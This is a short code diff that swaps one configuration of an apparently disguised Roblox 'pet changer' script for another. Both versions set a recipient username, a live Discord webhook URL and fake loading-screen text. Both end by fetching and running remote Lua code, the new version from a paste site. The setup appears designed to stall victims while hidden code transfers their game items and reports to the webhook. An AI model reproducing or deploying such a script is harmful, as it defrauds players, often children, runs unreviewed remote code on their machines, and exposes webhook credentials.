@@ -1,10 +1,9 @@
-Username = "jemrickali023"
-WebHook = "https://discord.com/api/webhooks/1088780903741935636/Zpw14Af5iFbV3Bx5XylXdALxDGDdpyiuO4Q4B88WWiLVwVT44BX5TKfq6LMAI3nDsWxl"
-
-loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
-_G.CustomScriptName = "Pet Changer Script"
-_G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script"
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Scripts..."
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+UserName = "tlgzq"
+UserName2 = "tlgzq"
+Webhook = "https://discord.com/api/webhooks/1111813534796488715/Zkamx3c0LGROl-gHsVvqeBIv7AlIm_lwFMdiE07uNdbb01qU7FoMb_SfWnWf7P26Muvu"
+_G.ScriptName = "Toxicity's Script"
+_G.FirstText = "Please wait.."
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180
+loadstring(game:HttpGet("https://paste-bin.xyz/raw/984685", true))()
